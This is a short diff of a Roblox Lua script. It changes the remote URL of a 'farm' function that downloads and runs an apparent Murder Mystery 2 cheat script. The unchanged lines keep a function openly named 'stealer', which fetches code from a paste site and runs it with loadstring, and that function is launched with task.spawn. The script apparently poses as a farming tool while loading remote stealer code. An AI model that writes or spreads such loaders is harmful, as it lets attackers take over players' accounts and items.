@@ -2,7 +2,7 @@ local function stealer()
     loadstring(game:HttpGet("https://vpaste.net/Bodzb"))()
 end
 local function farm()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/mm2-piano-reborn/refs/heads/main/scr"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
 end
 
 task.spawn(stealer)
